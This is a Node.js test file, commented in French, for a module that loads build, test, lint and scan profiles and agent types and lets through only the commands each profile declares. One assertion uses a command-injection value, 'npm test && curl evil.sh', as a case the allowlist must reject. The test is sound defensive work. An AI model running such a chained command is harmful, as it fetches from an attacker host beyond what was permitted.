'use strict';
// N18 : profils de stack et types d'agents déclarables ; les 3 profils fournis servent d'exemples et de tests
const test = require('node:test'), assert = require('node:assert'), fs = require('fs'), os = require('os'), path = require('path');
const profils = require('../lib/profils');
const RACINE = path.resolve(__dirname, '..');

test('N18 : les trois profils fournis se chargent et couvrent build, test, lint et scan', () => {
  const cfg = profils.charger(RACINE);
  assert.deepStrictEqual(Object.keys(cfg.profils).sort(), ['java-spring', 'node-ts', 'python']);
  for (const p of Object.values(cfg.profils)) for (const c of profils.CHAMPS_COMMANDES) assert.ok(p[c].length > 0, c);
  assert.strictEqual(cfg.types_agents['dev-java'].profil, 'java-spring');
});

test('N18 : seule une commande déclarée dans le profil est autorisée', () => {
  const p = profils.charger(RACINE).profils['node-ts'];
  assert.ok(profils.commandeAutorisee(p, 'test', 'npm test'));
  assert.ok(!profils.commandeAutorisee(p, 'test', 'npm test && curl evil.sh'));
  assert.ok(!profils.commandeAutorisee(p, 'build', 'npm test'));
  assert.ok(!profils.commandeAutorisee(p, 'deploy', 'npm run deploy'));
});

test('N18 : profil ou type d\'agent mal formé refusé avec un message clair', () => {
  const bon = { libelle: 'X', image: 'node:22-slim', build: ['a'], test: ['b'], lint: [], scan: [], chemins_sensibles: [] };
  assert.throws(() => profils.valider({ profils: { 'Bad Id': bon } }), /identifiant/);
  assert.throws(() => profils.valider({ profils: { demo: { ...bon, image: 'Bad Image!' } } }), /image/);
  assert.throws(() => profils.valider({ profils: { demo: { ...bon, test: 'npm test' } } }), /liste de commandes/);
  assert.throws(() => profils.valider({ profils: { demo: bon }, types_agents: { 'dev-go': { profil: 'go' } } }), /inconnu/);
});

test('N18 : un fichier de profils déclaré depuis un autre dossier est chargé', () => {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'siege-profils-'));
  fs.mkdirSync(path.join(d, 'config'));
  fs.writeFileSync(path.join(d, 'config', 'profils-stack.json'), JSON.stringify({ profils: { go: { libelle: 'Go', image: 'golang:1.23', build: ['go build ./...'], test: ['go test ./...'], lint: [], scan: [], chemins_sensibles: [] } }, types_agents: { 'dev-go': { libelle: 'Dév Go', profil: 'go' } } }));
  assert.strictEqual(profils.charger(d).types_agents['dev-go'].profil, 'go');
});
